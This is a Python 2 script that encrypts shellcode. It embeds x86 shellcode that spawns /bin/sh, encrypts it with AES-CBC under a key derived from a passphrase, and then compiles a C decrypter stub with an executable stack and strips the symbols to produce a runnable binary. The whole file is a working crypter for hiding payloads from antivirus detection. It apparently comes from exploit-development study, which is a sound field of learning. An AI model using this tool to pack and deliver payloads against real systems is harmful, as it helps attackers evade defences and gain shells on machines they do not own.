#!/usr/bin/python

'''
 Encrypt shellcode 
 Author Liviu I. 

 License http://creativecommons.org/licenses/by-sa/3.0/
 Legitimate use and research only
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE
*/
'''

from Crypto.Cipher import AES
from Crypto.Hash import MD5
from struct import *
from random import randint

import os
import sys

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

out_file = "encrypted_shellcode"
temp_src = "temp.c"
decrypt_shell = "aes-decrypt-polar.c"

def print_done(msg):
    print bcolors.OKBLUE + msg + bcolors.ENDC

def print_err(msg):
    print bcolors.FAIL + msg + bcolors.ENDC

def print_ok(msg):
    print bcolors.OKGREEN + msg + bcolors.ENDC

# Input string is multiple of block size
def to_hex(in_str):
	out = ""
	tmp = ["\\x%02x" % ord(c) for c in in_str]
	for i in range(0, len(in_str),16):
		out = out + '"' + "".join(tmp[i:i+16]) + "\"\n"

	return out

BS = 16 # Block size

# PKCS5 padding. Important!
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
unpad = lambda s : s[0:-ord(s[-1])]

shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2"
    "\x53\x89\xe1\xb0\x0b\xcd\x80"
)
def make_binary(password):
    sc_len = len(pad(shellcode))
    print_done("[+] Shellcode (len %d):" % (sc_len))
    print "%s" % (to_hex(shellcode))

    # Generate a secret key and random IV
    h = MD5.new()

    h.update(password)
    key = h.digest()
    str_key = to_hex(key)
    print_done("[+] Key:")
    print "%s" % str_key

    # Generate random IV
    iv = os.urandom(BS)
    str_iv = to_hex(iv) #"\"%s\"" % "".join(["\\x%02x" % ord(c) for c in iv])
    print_done("[+] IV:")
    print "%s" % str_iv

    # Create a cipher object using the random secret
    cipher = AES.new(key, AES.MODE_CBC, iv)

    enc = cipher.encrypt(pad(shellcode))
    str_enc = to_hex(enc)
    print_done("[+] Encrypted shellcode (len %d):" % (len(str_enc)))
    print "%s" % (str_enc)

    outline = open(decrypt_shell).read()
    code = outline % (str_iv, str_enc, sc_len, sc_len, password, len(password))

    # Write to temporary source file
    o = open(temp_src, "w")
    o.write(code)
    o.close()

    # Compile
    compile_cmd = "gcc -Wall -z execstack -o %s %s PolarSSL/aes.c PolarSSL/md5.c" % \
       (out_file, temp_src)
    print_done("[+] Compiling:") 
    print " -> %s" % compile_cmd
    os.system(compile_cmd)


    # Strip all symbols
    strip_cmd = "strip --strip-all %s" % (out_file)
    print " -> %s" % (strip_cmd)
    os.system(strip_cmd)

    # Delete intermediate files
    clean_cmd = "rm %s" % (temp_src)
    print " -> %s" % (clean_cmd)
    os.system(clean_cmd)

    print_ok("\n[*] Done. Run ./%s" % (out_file))

def usage(prog_name):
    print '''Usage:
    %s [passphrase]
    ''' % (prog_name)

    
if __name__ == "__main__":
    if len(sys.argv) != 2:
        usage(sys.argv[0])
        sys.exit(2)
    make_binary(sys.argv[1])
